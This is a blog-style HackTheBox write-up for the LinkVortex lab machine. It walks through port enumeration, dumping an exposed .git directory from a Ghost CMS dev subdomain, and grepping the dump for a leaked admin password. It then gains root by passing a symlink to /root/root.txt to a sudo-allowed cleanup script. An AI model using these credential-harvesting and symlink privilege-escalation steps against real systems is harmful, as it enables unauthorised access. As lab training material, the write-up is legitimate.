---
TitleSEO:    "HackTheBox LinkVortex Writeup | ZureFX"
TitlePost:   "HTB LinkVortex — Easy Linux"
Author:      "ZureFX"
Description: "HackTheBox LinkVortex writeup. Ghost CMS credential leak via git repo exposure and symlink exploit for root."
Keywords:    "hackthebox, linkvortex, writeup, ghost cms, git, symlink, linux, easy"
URL:         "https://zurefx.github.io/writeups/htb-linkvortex.html"
URL_IMAGES:  "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-linkvortex/"
Date:        "2026-03-23"
Tags:        "HackTheBox, Easy, Linux, GhostCMS, Symlink"
Section:     "writeups"
Lang:        "en"
main_img:    "htb-linkvortex"
Permalink:   "/writeups/htb-linkvortex.html"
BtnLabel:    "Read Writeup"
Pick:        1
---

## Enumeration

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Ghost CMS 5.58
```

Subdomains found: `dev.linkvortex.htb` — exposed `.git` directory.

## Credential Leak

Dumped git repo with `git-dumper`:

```bash
git-dumper http://dev.linkvortex.htb/.git ./repo
grep -r "password" ./repo
```

Found `admin@linkvortex.htb:OctopiFociPilfer45` in a config file.

## Privilege Escalation

Sudo rule allows running a cleanup script as root. Script follows symlinks without validation.

```bash
ln -s /root/root.txt /tmp/test.png
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/test.png
```

Root flag read via symlink abuse.